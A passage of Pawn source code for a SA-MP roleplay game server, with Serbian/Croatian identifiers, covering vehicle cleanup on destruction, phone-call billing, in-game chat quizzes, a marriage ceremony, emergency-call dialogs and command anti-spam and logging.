                DronVozi[ i ] = -1;
            }

            if(vehicleid == pilotVozilo[i] && pilotVozilo[i] != -1) {

                DisablePlayerCheckpoint(i);

                radiPilot[ i ] = 0;
                if(IsValidVehicle(pilotVozilo[i]))
                    Novi_DestroyVehicle(pilotVozilo[i]);

                pilotVozilo[i] = -1;

                PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                UzeoOpremu[ i ] = false;
            }

            if(vehicleid == posaoDrvaVozilo[i] && posaoDrvaVozilo[i] != -1) {

                DisablePlayerCheckpoint(i);

                prevoziDrva[ i ] = 0;
                if(IsValidVehicle(posaoDrvaVozilo[i]))
                    Novi_DestroyVehicle(posaoDrvaVozilo[i]);

                posaoDrvaVozilo[i] = -1;

                // if(IsValidDynamicObject(posaoDrvaObjekat[i]))
                //     DestroyDynamicObject(posaoDrvaObjekat[i]);

                PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                UzeoOpremu[ i ] = false;
            }

            if(vehicleid == kosacVozilo[i] && kosacVozilo[i] != -1) {

                DisablePlayerCheckpoint(i);

                PokosenaTrava[ i ] = 0;
                KrenuoKosenje[ i ] = false;

                Novi_DestroyVehicle(kosacVozilo[i]);
                kosacVozilo[i] = -1;
                TogglePlayerControllable( i, true );

                PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                UzeoOpremu[ i ] = false;
            }
            if(vehicleid == DeliveryVozilo[i] && DeliveryVozilo[i] != -1) {

                Novi_DisablePlayerCheckpoint(i);
                DeliveryCP[i] = 0;
                RadiDelivery[i] = false;

                Novi_DestroyVehicle(DeliveryVozilo[i]);
                DeliveryVozilo[i] = -1;

                PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
                UzeoOpremu[ i ] = false;
            }
            if(vehicleid == RentVozilo[i]) {

                Novi_DestroyVehicle(RentVozilo[i]);
                Rentao[i] = false;
                RentVozilo[i] = -1;
                SendInfoMessage(i, "Rent vozilo ti je unisteno! Vise ga ne rentas.");
            }
            if(AdminVozilo[ i ] != -1 && vehicleid == AdminVozilo[i]) {
                Novi_DestroyVehicle( AdminVozilo[ i ] ); 
                AdminVozilo[ i ] = -1;
            }
            if( helperVeh[ i ] != -1 && vehicleid == helperVeh[i] ) Novi_DestroyVehicle( helperVeh[ i ] ), helperVeh[ i ] = -1;

            if( VPVeh[ i ] != -1 ) Novi_DestroyVehicle( VPVeh[ i ] ), VPVeh[ i ] = -1;

            if(OrgVeh[i] == vehicleid) {

                new id = OrgVehID[i];
                if(OrgVehBroj[i] == 1) {

                    OrgVehInfo[id][oVehKolicina1]++;
                }
                if(OrgVehBroj[i] == 2) {

                    OrgVehInfo[id][oVehKolicina2]++;
                }
                if(OrgVehBroj[i] == 3) {

                    OrgVehInfo[id][oVehKolicina3]++;
                }
                if(OrgVehBroj[i] == 4) {

                    OrgVehInfo[id][oVehKolicina4]++;
                }
                if(OrgVehBroj[i] == 5) {

                    OrgVehInfo[id][oVehKolicina5]++;
                }
                Novi_DestroyVehicle(OrgVeh[i]);
                OrgVeh[i] = -1;
                // Delete3DTextLabel(OrgVehLabelIgrac[i]);
                SacuvajOrgVehPickup(id);
            }

        }

        if(GetVehicleModel(vehicleid) == chopperid)
        {
            for(new shg=0;shg<=players;shg++)
            {
                if(GetPVarInt(shg,"chop_id") == vehicleid && GetPVarInt(shg,"roped") == 1)
                {
                    Novi_DisablePlayerCheckpoint(shg);
                    SetPVarInt(shg,"roped",0);
                    Novi_DisablePlayerCheckpoint(shg);
                    ClearAnimations(shg);
                    TogglePlayerControllable(shg,1);
                    for(new destr3=0;destr3<=ropelength;destr3++)
                    {
                        DestroyDynamicObject(r0pes[shg][destr3]);
                    }
                }
            }
        }

        VehicleObjectCheck( vehicleid );
        ResetVehicleStatistics( vehicleid );

        if(Indicators_xqz[vehicleid][2]) DestroyObject(Indicators_xqz[vehicleid][2]), DestroyObject(Indicators_xqz[vehicleid][3]),DestroyObject(Indicators_xqz[vehicleid][5]),Indicators_xqz[vehicleid][2]=0;
        if(Indicators_xqz[vehicleid][0]) DestroyObject(Indicators_xqz[vehicleid][0]), DestroyObject(Indicators_xqz[vehicleid][1]),DestroyObject(Indicators_xqz[vehicleid][4]),Indicators_xqz[vehicleid][0]=0;

    }
    return 1;
}

// public OnVehicleDeath( vehicleid, killerid ) {

//     foreach(Player, i) {

//         if(vehicleid == WorkShopVeh[i] && WorkShopVeh[i] != -1) {

//             Novi_DestroyVehicle(WorkShopVeh[i]);
//             WorkShopVeh[i] = -1;
//             resetWorkshopBuying(i);
//         }

//         if(vehicleid == WorkShopVehTow[i] && WorkShopVehTow[i] != -1) {

//             Novi_DestroyVehicle(WorkShopVehTow[i]);
//             WorkShopVehTow[i] = -1;
//             resetWorkshopBuying(i);
//         }

//         if(vehicleid == DronVozi[i] && DronVozi[i] != -1) {

//             Novi_DestroyVehicle( DronVozi[ i ] );
//             DronVozi[ i ] = -1;
//         }

//         if(vehicleid == pilotVozilo[i] && pilotVozilo[i] != -1) {

//             DisablePlayerCheckpoint(i);

//             radiPilot[ i ] = 0;
//             if(IsValidVehicle(pilotVozilo[i]))
//                 Novi_DestroyVehicle(pilotVozilo[i]);

//             pilotVozilo[i] = -1;

//             PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
//             UzeoOpremu[ i ] = false;
//         }

//         if(vehicleid == posaoDrvaVozilo[i] && posaoDrvaVozilo[i] != -1) {

//             DisablePlayerCheckpoint(i);

//             prevoziDrva[ i ] = 0;
//             if(IsValidVehicle(posaoDrvaVozilo[i]))
//                 Novi_DestroyVehicle(posaoDrvaVozilo[i]);

//             posaoDrvaVozilo[i] = -1;

//             // if(IsValidDynamicObject(posaoDrvaObjekat[i]))
//             //     DestroyDynamicObject(posaoDrvaObjekat[i]);

//             PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
//             UzeoOpremu[ i ] = false;
//         }

//         if(vehicleid == kosacVozilo[i] && kosacVozilo[i] != -1) {

//             DisablePlayerCheckpoint(i);

//             PokosenaTrava[ i ] = 0;
//             KrenuoKosenje[ i ] = false;

//             Novi_DestroyVehicle(kosacVozilo[i]);
//             kosacVozilo[i] = -1;
//             TogglePlayerControllable( i, true );

//             PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
//             UzeoOpremu[ i ] = false;
//         }
//         if(vehicleid == DeliveryVozilo[i] && DeliveryVozilo[i] != -1) {

//             Novi_DisablePlayerCheckpoint(i);
//             DeliveryCP[i] = 0;
//             RadiDelivery[i] = false;

//             Novi_DestroyVehicle(DeliveryVozilo[i]);
//             DeliveryVozilo[i] = -1;

//             PostaviSkin( i, PlayerInfo[ i ][ xSkin ] );
//             UzeoOpremu[ i ] = false;
//         }
//         if(vehicleid == RentVozilo[i]) {

//             Novi_DestroyVehicle(RentVozilo[i]);
//             Rentao[i] = false;
//             RentVozilo[i] = -1;
//             SendInfoMessage(i, "Rent vozilo ti je unisteno! Vise ga ne rentas.");
//         }
//         if(AdminVozilo[ i ] != -1 && vehicleid == AdminVozilo[i]) {
//             Novi_DestroyVehicle( AdminVozilo[ i ] ); 
//             AdminVozilo[ i ] = -1;
//         }
//         if( helperVeh[ i ] != -1 && vehicleid == helperVeh[i] ) Novi_DestroyVehicle( helperVeh[ i ] ), helperVeh[ i ] = -1;

//         if( VPVeh[ i ] != -1 ) Novi_DestroyVehicle( VPVeh[ i ] ), VPVeh[ i ] = -1;

//         if(OrgVeh[i] == vehicleid) {

//             new id = OrgVehID[i];
//             if(OrgVehBroj[i] == 1) {

//                 OrgVehInfo[id][oVehKolicina1]++;
//             }
//             if(OrgVehBroj[i] == 2) {

//                 OrgVehInfo[id][oVehKolicina2]++;
//             }
//             if(OrgVehBroj[i] == 3) {

//                 OrgVehInfo[id][oVehKolicina3]++;
//             }
//             if(OrgVehBroj[i] == 4) {

//                 OrgVehInfo[id][oVehKolicina4]++;
//             }
//             if(OrgVehBroj[i] == 5) {

//                 OrgVehInfo[id][oVehKolicina5]++;
//             }
//             Novi_DestroyVehicle(OrgVeh[i]);
//             OrgVeh[i] = -1;
//             // Delete3DTextLabel(OrgVehLabelIgrac[i]);
//             SacuvajOrgVehPickup(id);
//         }

//     }

//     if(GetVehicleModel(vehicleid) == chopperid)
//     {
//         for(new shg=0;shg<=players;shg++)
//         {
//             if(GetPVarInt(shg,"chop_id") == vehicleid && GetPVarInt(shg,"roped") == 1)
//             {
//                 Novi_DisablePlayerCheckpoint(shg);
//                 SetPVarInt(shg,"roped",0);
//                 Novi_DisablePlayerCheckpoint(shg);
//                 ClearAnimations(shg);
//                 TogglePlayerControllable(shg,1);
//                 for(new destr3=0;destr3<=ropelength;destr3++)
//                 {
//                     DestroyDynamicObject(r0pes[shg][destr3]);
//                 }
//             }
//         }
//     }

// 	VehicleObjectCheck( vehicleid );
// 	ResetVehicleStatistics( vehicleid );

//     if(Indicators_xqz[vehicleid][2]) DestroyObject(Indicators_xqz[vehicleid][2]), DestroyObject(Indicators_xqz[vehicleid][3]),DestroyObject(Indicators_xqz[vehicleid][5]),Indicators_xqz[vehicleid][2]=0;
//     if(Indicators_xqz[vehicleid][0]) DestroyObject(Indicators_xqz[vehicleid][0]), DestroyObject(Indicators_xqz[vehicleid][1]),DestroyObject(Indicators_xqz[vehicleid][4]),Indicators_xqz[vehicleid][0]=0;
// 	return true;
// }

VehicleObjectCheck( vehicleid ) {
	if( vehicleid != -1 ) {
	    if( Neon[ vehicleid ] == 1 ) {
	 		Neon[ vehicleid ] = 0;
		    DestroyDynamicObject( NeonObject1[ vehicleid ] );
	     	DestroyDynamicObject( NeonObject2[ vehicleid ] );
		}
		if( WOOD[ vehicleid ] == true ) {
	 		WOOD[ vehicleid ] = false;
		    DestroyDynamicObject( WOODObject[ vehicleid ] );
		}
		if( Siren[ vehicleid ] == 1 ) {
		    Siren[ vehicleid ] = 0;
	 		DestroyDynamicObject( SirenObject[ vehicleid ] );
		}
		if( CarSign[ vehicleid ] == 1 ) {
		    CarSign[ vehicleid ] = 0;
			Delete3DTextLabel( vehicle3Dtext[ vehicleid ] );
	    }

	    for( new i = 0; i < MAX_CARGOS; i++ ) {
			if( Cargo[ i ][ cVehID  ] == vehicleid && Cargo[ i ][ cType ] != 0 && Cargo[ i ][ cPlaced  ] == 0 ) {
	            DestroyDynamicObject( Cargo[ i ][ cObjID ] );
				Cargo[ i ][ cType ] = 0;
				Cargo[ i ][ cPlaced ] = 0;
				Cargo[ i ][ cObjPos ][ 0 ] = 0;
				Cargo[ i ][ cObjPos ][ 1 ] = 0;
				Cargo[ i ][ cObjPos ][ 2 ] = 0;
				Cargo[ i ][ cVehID  ] = -1;
			}
		}
	}
}

strtok(const string[], &index)
{
	new length = strlen(string);

	while ((index < length) && (string[index] <= ' '))
	{
		index++;
	}

	new offset = index,
	    result[20];

	while ((index < length) && (string[index] > ' ') && ((index - offset) < (sizeof(result) - 1)))
	{
		result[index - offset] = string[index];
		index++;
	}

	result[index - offset] = EOS;
	return result;
}

CellphoneCheck( playerid ) {
	if( GetPVarInt( playerid, "CellTime" ) > 0 ) {
		if( GetPVarInt( playerid, "CellTime") == cchargetime ) {
			SetPVarInt( playerid, "CellTime", 1 );

			if( GetPVarInt( GetPVarInt( playerid, "Mobile" ), "Mobile" ) == playerid ) {
				PovecajPVarInt( playerid, "CallCost", callcost );
			}
		}

		PovecajPVarInt( playerid, "CellTime", 1);

		if( GetPVarInt(GetPVarInt( playerid, "Mobile"), "Mobile") == -1 && GetPVarInt( playerid, "CellTime") == 5 ) {
			format( globalstring, sizeof( globalstring ), "* %s zvoni mobilni telefon.", ImeIgraca( GetPVarInt( playerid, "Mobile") ) );
			PorukaRadius(30.0, GetPVarInt( playerid, "Mobile"), globalstring, LJUBICASTA );
		}
	}
	if( GetPVarInt( playerid, "CellTime") == 0 && GetPVarInt( playerid, "CallCost") > 0 ) {
		format(  globalstring, sizeof( globalstring ), "~w~Cena poziva~n~~r~$%d", GetPVarInt( playerid, "CallCost"));
		PlayerInfo[ playerid ][ xTelefonBon ] -= GetPVarInt( playerid, "CallCost");
		GameTextForPlayer( playerid, globalstring, 5000, 1 );
		SetPVarInt( playerid, "CallCost", 0 );
	}
}

SearchingHit( playerid ) {
	new string[ 128 ];
	new searchhit = 0;
	foreach( Player, i ) {
		if( searchhit == 0 ) {
  			if( PlayerInfo[ i ][ xHitmenCena ] > 0 && HitmanInfo[ i ][ GotHit ] == 0 && OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] != ORG_TIP_HITM ) {
		        searchhit = 1;
		        hitfound = 1;
		        ahitid = i;
		        foreach( Player, k ){
				    if( OI[ PlayerInfo[ k ][ xClan ] ][ oTip ] == ORG_TIP_HITM ) {
	               		SCM( k, BELA, "|______________________ Novosti Agencije __________________________|");
				        SCM( k, SVETLOPLAVA, "*** Nova Poruka: Nova meta je dostupna. ***");
				        format( string, sizeof( string ), "Osoba: %s   ID: %d   Vrednost: $%d", ImeIgraca( i ), i, PlayerInfo[ i ][ xHitmenCena ] );
						SCM( k, SVETLOPLAVA, string );
						SCM( k, ZUTA, "Koristite Givehit id, da biste dodjelili metu jednome od vasih agenata.");
						SCM( k, BELA, "|______________________________________________________________________|");
	      			}
      			}
				return 0;
		    }
		}
	}
	if( searchhit == 0 ) {
	    SendErrorMessage( playerid, "Nema dostupnih meta !");
	}
	return 0;
}

public OnPlayerText( playerid, text[] ) {

    if(strfind(text, "{", true ) != -1 ) {
        SendErrorMessage(playerid, "Nedozvoljeni karakter!");
        return 0;
    }
    if(strfind(text, "}", true ) != -1 ){ 
        SendErrorMessage(playerid, "Nedozvoljeni karakter!");
        return 0;
    }

    if(matematikaAktivan) {

        if(strval(text) == matematikaRezultat) {

            va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - ZADATAK] {FFFFFF}Igrac {FF0000}%s{FFFFFF} je tacno resio zadatak! Resenje : {FF0000}%d", ImeIgraca(playerid), matematikaRezultat);
            SendInfoMessage(playerid, "Kao nagradu za tacan odgovor si dobio 1.500$!");

            DajIgracuNovac(playerid, 1500);

            matematikaAktivan = false;
            matematikaRezultat = 0;

            return 0;
        }
    }

    if(aktivanKviz) {

        if(!strcmp( text, gradoviKviz[kvizResenje][gradoviRez], true )) {

            va_SendClientMessageToAll(-1, "{F55B65}[VALHALLA - KVIZ] {FFFFFF}Igrac {FF0000}%s{FFFFFF} je tacno resio kviz! Resenje : {FF0000}%s", ImeIgraca(playerid), gradoviKviz[kvizResenje][gradoviRez]);
            SendInfoMessage(playerid, "Kao nagradu za tacan odgovor si dobio 1.500$!");

            DajIgracuNovac(playerid, 1500);

            aktivanKviz = false;
            kvizResenje = 0;

            return 0;
        }
    }

	new tmp[ 128 ];
	if( PlayerInfo[ playerid ][ xMute ] != 0 ) {
		SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
		return 0;
	}
    if( PlayerInfo[ playerid ][ xParadox ] != 0 ) {
        SendErrorMessage( playerid, "Ne mozete pricati, u paradoxu si.");
        return 0;
    }

	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xSupporter ] < 1 ) {
	 	if( antiCheatCS[ playerid ][ SpamChat ] > 0) {
		    SCM( playerid, SVETLOCRVENA, "| V:AC | Ne mozes spamati komande svakih 2 sec!");
			return 0;
		}
		antiCheatCS[ playerid ][ SpamChat ] += 2;
	}
	
	for( new b = 0; b < sizeof( ZabranjeneReci ); b++) {
        if( strfind( text, ZabranjeneReci[ b ], true ) != -1 ) {
            format( globalstring, sizeof( globalstring ), "[!]%s[%d]: %s", ImeIgraca( playerid ), playerid, text );
       		AdminPoruka( 0x808000AA, globalstring );
       		return 0;
        }
	}
	
	if( GetPVarInt( playerid, "TalkingLive" ) != 255 ) {
		if( GetFactionType( playerid ) == ORG_TIP_CNN )
		{
		    format( globalstring, sizeof( globalstring ), "Reporter (Uzivo) %s: "col_white"%s", ImeIgraca( playerid ), text );
			OOCNews( 0xE79E03AA, globalstring );
		}
		else
		{
		    format( globalstring, sizeof( globalstring ), "Gost (Uzivo) %s: "col_white"%s", ImeIgraca( playerid ), text );
			OOCNews( 0xE79E03AA, globalstring );
		}
		return 0;
	}
	if( MarriageCeremoney{ playerid } > 0 ) {
	    new idx;
	    tmp = strtok( text, idx );
	    if( ( strcmp( "da", tmp, true, strlen( tmp ) ) == 0) && ( strlen( tmp ) == strlen( "da" ) ) ) {
		    if( GotProposedBy[ playerid ] < 999 ) {
			    if( IsPlayerConnected( GotProposedBy[ playerid ] ) ) {
				    format( globalstring, sizeof( globalstring ), "Maticar: %s da li vi uzimate %s za vasu voljenu zenu? (Ukoliko zelite to ukucajte 'da').", ImeIgraca( GotProposedBy[ playerid ] ), ImeIgraca( playerid ) );
					SCM( GotProposedBy[ playerid ], BELA, globalstring );
					MarriageCeremoney{ GotProposedBy[ playerid ] } = 1;
					MarriageCeremoney{ playerid } = 0;
					GotProposedBy[ playerid ] = 999;
				    return 0;
			    }
			    else {
			        MarriageCeremoney{ playerid } = 0;
			        GotProposedBy[ playerid ] = 999;
			        return 0;
			    }
			}
			else if( ProposedTo[ playerid ] < 999 ) {
			    if( IsPlayerConnected( ProposedTo[ playerid ] ) ) {
					format( globalstring, sizeof( globalstring ), "Maticar: %s i %s proglasavam vas za...Muza i Zenu, Mozete poljubiti mladu.", ImeIgraca( playerid ), ImeIgraca( ProposedTo[ playerid ] ));
					SCM( playerid, BELA, globalstring );
				   	format( globalstring, sizeof( globalstring ), "Maticar: %s i %s proglasavam vas za...Muza i Zenu, Mozete poljubiti mladozenju.", ImeIgraca( ProposedTo[ playerid ] ), ImeIgraca( playerid ));
					SCM( ProposedTo[ playerid ], BELA, globalstring );
					format( globalstring, sizeof( globalstring ), "Najnovije vesti: Imamo novi srecni par, %s i %s su se upravo vencali.", ImeIgraca( playerid ), ImeIgraca( ProposedTo[ playerid ] ) );
					OOCNews( BELA, globalstring );

					MarriageCeremoney{ ProposedTo[ playerid ] } = 0;
					MarriageCeremoney{ playerid } = 0;
					new namestring[ 24 ];
					format( namestring, sizeof( namestring ), "%s", ImeIgraca( playerid ) );
					strmid( PlayerInfo[ ProposedTo[ playerid ] ][ xMarriedTo ], namestring, 0, strlen( namestring ), 24 );
					format( namestring, sizeof( namestring), "%s", ImeIgraca( ProposedTo[ playerid ] ) );
					strmid( PlayerInfo[ playerid ][ xMarriedTo ], namestring, 0, strlen( namestring ), 24 );
					DajIgracuNovac( playerid, -10000 );
					PlayerInfo[ playerid ][ xMarried ] = true;
					PlayerInfo[ ProposedTo[ playerid ] ][ xMarried ] = true;
					ProposedTo[ playerid ] = 999;
					MarriageCeremoney{ playerid } = 0;
				    return 0;
			    }
			    else {
			        MarriageCeremoney{ playerid } = 0;
			        ProposedTo[ playerid ] = 999;
			        return 0;
			    }
			}
		}
		else {
		    if( GotProposedBy[ playerid ] < 999 ) {
				if( IsPlayerConnected( GotProposedBy[ playerid ] ) ) {
					format( globalstring, sizeof( globalstring ), "* Niste zeleli da se udate za %s, niste izgovorili 'da'.", ImeIgraca( GotProposedBy[ playerid ] ) );
				    SCM( playerid, ZUTA, globalstring );
				    format( globalstring, sizeof( globalstring ), "* %s nije izgovorio 'da'.", ImeIgraca( playerid ) );
				    SCM( GotProposedBy[ playerid ], ZUTA, globalstring );
				    return 0;
			    }
			    else {
			        MarriageCeremoney{ playerid } = 0;
			        GotProposedBy[ playerid ] = 999;
			        return 0;
			    }
		    }
		    else if( ProposedTo[ playerid ] < 999 ) {
			    if( IsPlayerConnected( ProposedTo[ playerid ] ) ) {
					format( globalstring, sizeof( globalstring ), "* Niste zeleli da se udate za %s, niste izgovorili 'da'.", ImeIgraca( ProposedTo[ playerid ] ) );
				    SCM( playerid, ZUTA, globalstring );
				    format( globalstring, sizeof( globalstring ), "* %s nije izgovorila 'da'.", ImeIgraca( playerid ) );
				    SCM( ProposedTo[ playerid ], ZUTA, globalstring );
				    return 0;
			    }
			    else {
			        MarriageCeremoney{ playerid } = 0;
			        ProposedTo[ playerid ] = 999;
			        return 0;
			    }
			}
		}
	    return 0;
	}
    if(GetPVarInt( playerid, "Mobile") != -1 ) {
		new idx;
		tmp = strtok(text, idx);
		format( globalstring, sizeof( globalstring ), "[Mobitel] %s kaze:"col_white" %s", ImeIgraca( playerid ), text );
		PorukaRadius( 20.0, playerid, globalstring, 0xE6E6E6E6 );
		if( GetPVarInt( playerid, "Mobile") == 915 ) {
			if( !strlen( tmp ) ) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Oprostite ali nerazumijem?");
				return 0;
			}
   			new wanted[128];
			SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Obavijestili smo sve jedinice u tom podrucju.");
            for( new id = 1; id < MAX_ORG; id++) {
			    if( OI[ id ][ oTip ] == ORG_TIP_MD ) {
					format(wanted, sizeof(wanted), "HITNA LINIJA: Svim jedinicama, Pozivatelj: Nepoznat (( %s ))", ImeIgraca( playerid ) );
					OrgPorukaMD( id, 0xFF8282AA, wanted );
					format(wanted, sizeof(wanted), "HITNA LINIJA: Incident: %s", text);
					OrgPorukaMD( id, 0xFF8282AA, wanted );
					format(wanted, sizeof(wanted), "HITNA LINIJA: Lokacija: %s", PlayerInjured[ playerid ][ pVictimLocation ] );
					OrgPorukaMD( id, 0xFF8282AA, wanted );
				}
			}
			SCM( playerid, 0xBFC0C2FF, "Prekinuli su...");
			SetPVarInt( playerid, "Mobile", -1 );
			RemovePlayerAttachedObject( playerid, OBJECT_SLOT_RHAND );
			SetPlayerSpecialAction( playerid, SPECIAL_ACTION_STOPUSECELLPHONE );
			return 0;
		}
		if( GetPVarInt( playerid, "Mobile" ) == 913 ) {
			if(!strlen(tmp)) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Oprostite ali nerazumijem?");
				return 0;
			}
			new wanted[128];
			strmid( PlayerCrime[ playerid ][ pAccusing ], text, 0, strlen(text), 255 );
			PlayerCrime[ playerid ][ pDone ] = 1;
			SCM( playerid, 0x2641FEAA, "Policija: Obavijestili smo sve jedinice u tom podrucju.");
			SCM( playerid, 0x2641FEAA, "Zahvaljujemo na prijavi zlocina");
			for( new id = 1; id < MAX_ORG; id++) {
			    if( OI[ id ][ oTip ] == ORG_TIP_PD ) {
					OrgPoruka( id, 0x83BFBFFF, "|__________________911 Poziv__________________|");
					format(wanted, sizeof(wanted), "Pozivaoc: %s | Broj: %d", ImeIgraca( playerid ), PlayerInfo[ playerid ][ xBrojTelefona ] );
					OrgPoruka( id, 0x83BFBFFF, wanted );
					format(wanted, sizeof(wanted), "Lokacija: %s",PlayerCrime[ playerid ][ pLocation ] );
					OrgPoruka( id, 0x83BFBFFF, wanted );
					format(wanted, sizeof(wanted), "Zlocin: %s",PlayerCrime[ playerid ][ pAccusing ] );
					OrgPoruka( id, 0x83BFBFFF, wanted );
					format(wanted, sizeof(wanted), "Trag Mobitela: %s", GetPlayerLocation( playerid ) );
					OrgPoruka( id, 0x83BFBFFF, wanted );
				}
			}
			SCM( playerid, 0xBFC0C2FF, "Prekinuli su..." );
			SetPVarInt( playerid, "Mobile", -1 );
			RemovePlayerAttachedObject( playerid, OBJECT_SLOT_RHAND );
			SetPlayerSpecialAction( playerid, SPECIAL_ACTION_STOPUSECELLPHONE );
			return 0;
		}
		if( GetPVarInt( playerid, "Mobile") == 912 ) {
			if(!strlen(tmp)) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Oprostite ali nerazumijem?");
				return 0;
			}
			strmid( PlayerCrime[ playerid ][ pLocation ], text, 0, strlen(text), 255);
			SCM( playerid, 0xFF8282AA, "HITNA LINIJA:Molimo vas ukratko opisite zlocin.");
			SetPVarInt( playerid, "Mobile", 913 );
			return 0;
		}
		
		if(GetPVarInt( playerid, "Mobile") == 916) {
			if(!strlen(tmp)) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Oprostite ali nerazumijem?");
				return 0;
			}
			strmid( PlayerInjured[ playerid ][pVictimLocation], text, 0, strlen(text), 255);
			SCM( playerid, 0xFF8282AA, "HITNA LINIJA:Molimo vas ukratko opisite incident.");
			SetPVarInt( playerid, "Mobile", 915 );
			return 0;
		}
		if(GetPVarInt( playerid, "Mobile") == 911) {
			if(!strlen(tmp)) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Oprostite nerazumijem, da li trebate policiju ili hitnu pomoc?");
				return 0;
			}
			else if((strcmp("police", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("police"))) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Spajam vas sa policijom, ostanite na liniji.");
				SetPVarInt( playerid, "Mobile", 912);
				SCM( playerid, 0x2641FEAA, "HITNA LINIJA: Molimo Vas recite nam svoju lokaciju.");
				return 0;
			}
			else if((strcmp("paramedic", tmp, true, strlen(tmp)) == 0) && (strlen(tmp) == strlen("paramedic"))) {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Spajam vas sa bolnicom, ostanite na liniji.");
				SetPVarInt( playerid, "Mobile", 916);
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Molimo Vas recite nam svoju lokaciju.");
				return 0;
			}
			else {
				SCM( playerid, 0xFF8282AA, "HITNA LINIJA: Oprostite ne razumijem, da li trebate police ili paramedic?");
				return 0;
			}
		}
		if( IsPlayerConnected( GetPVarInt( playerid, "Mobile" ) ) ) {
		    if( GetPVarInt( GetPVarInt( playerid, "Mobile" ), "Mobile" ) == playerid ) {
				SCM( GetPVarInt( playerid, "Mobile" ), ZUTA , globalstring);
			}
		}
		else {
			SCM( playerid, ZUTA,"Nema nikoga tamo.");
		}
		return 0;
	}
    if( realchat ) {
	    if( PlayerLogged[ playerid ] != true ) {
            SendErrorMessage(playerid, "Nisi ulogovan!");
	        return 0;
      	}
  //     	if( !IsPlayerInAnyVehicle( playerid ) && GetPlayerSpecialAction( playerid ) != SPECIAL_ACTION_USEJETPACK ) {
		//     if( GetPVarInt( playerid, "ToggedAnim" ) == 0 && PosaoRudar[ playerid ] == 0 ) {
		// 	    if(strlen(text) > 0 && strlen(text) < 10)
		// 			ApplyAnimation( playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,500,1);
		// 		else if(strlen(text) >= 10 && strlen(text) < 20)
		// 		    ApplyAnimation( playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,1000,1);
		//    		else if(strlen(text) >= 20 && strlen(text) < 30)
		// 		    ApplyAnimation( playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,1500,1);
		// 		else if(strlen(text) >= 30 && strlen(text) < 40)
		// 		    ApplyAnimation( playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,2000,1);
		// 		else if(strlen(text) >= 40 && strlen(text) < 50)
		// 		    ApplyAnimation( playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,2500,1);
		//    		else if(strlen(text) >= 50 && strlen(text) < 61)
		// 		    ApplyAnimation( playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,3000,1);
		// 	}
		// }
		new string[ 128 ];
		if( IsPlayerInAnyVehicle( playerid ) && !IsACabrio( GetVehicleModel( GetPlayerVehicleID( playerid ) ) ) ) {
			if( Maskuse[ playerid ] == true )
	    		format( string, sizeof( string ), "Maska_%d kaze (vozilo) : %s", PlayerInfo[ playerid ][ xMaskID ], text );
			else
                format( string, sizeof( string ), "%s kaze (vozilo): %s", ImeIgraca( playerid ), text );
			PorukaRadius( 20.0 , playerid, string, -1 );
			SetPlayerChatBubble( playerid, text, 0xFF0000FF, 20.0, 7000 );
			
			new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), text );
			LogSave( "Ostalo/LogICChat.log", string1 );
		}
		else {
			if( Maskuse[ playerid ] == true )
	    		format( string, sizeof( string ), "Maska_%d kaze: %s", PlayerInfo[ playerid ][ xMaskID ], text );
			else
                format( string, sizeof( string ), "%s kaze: %s", ImeIgraca( playerid ), text );
			PorukaRadius( 20.0 , playerid, string, -1 );
			SetPlayerChatBubble( playerid, text, 0xFF0000FF, 20.0, 7000 );
			
			new string1[ 128 ];
			format( string1, sizeof( string1 ), "Igrac %s: %s", ImeIgraca( playerid ), text );
			LogSave( "Ostalo/LogICChat.log", string1 );
		}
		return 0;
	}
	return 0;
}

public OnPlayerCommandReceived( playerid, cmd[], params[], flags)
{
	if(!IsPlayerConnected( playerid )) return 0;

    if(PlayerInfo[playerid][xAdmin] < 1 && PlayerInfo[playerid][xSupporter] < 1) {

        if(SpamKomandi[playerid] != 0) {
            SCM( playerid, SVETLOCRVENA, "| V:AC | Ne mozes spamati komande svakih 2 sec!");
            SpamKomandi[playerid] = 2;
            return 0;
        }
    }

	if( PlayerLogged[ playerid ] != true )
	{
	    SendErrorMessage( playerid, "Trebate se prijaviti da bi ste mogli koristit ovu komandu !");
		return 0;
	}

    if( PlayerInfo[ playerid ][ xParadox ] != 0 ) {
        SendErrorMessage( playerid, "Ne mozete koristiti komande, u paradoxu si.");
        return 0;
    }
	return 1;
}

public OnPlayerCommandPerformed( playerid, cmd[], params[], result, flags) {

	if( result == -1 ) return SendErrorMessage( playerid, "Upisali ste komandu koja ne postoji( popis pogledajte na /help ).");

 
	new string[ 128 ]; format( string, sizeof( string ), "Igrac %s | Komanda: %s", ImeIgraca( playerid ), cmd ); LogSave( "Ostalo/LogKomandi.log", string );

	return true;
}

public OnPlayerEnterVehicle( playerid, vehicleid, ispassenger) {

    if(GetVehicleModel(vehicleid) == chopperid && ispassenger)
    {
        SetPVarInt(playerid,"chop_id",GetPlayerVehicleID(playerid));
        SetPVarInt(playerid,"roped",0);
    }
    else SetPVarInt(playerid,"chop_id",0);

	if( ServerInfo[ RRVehicle ] == true ) {
	    if( !occupied[ vehicleid ] )
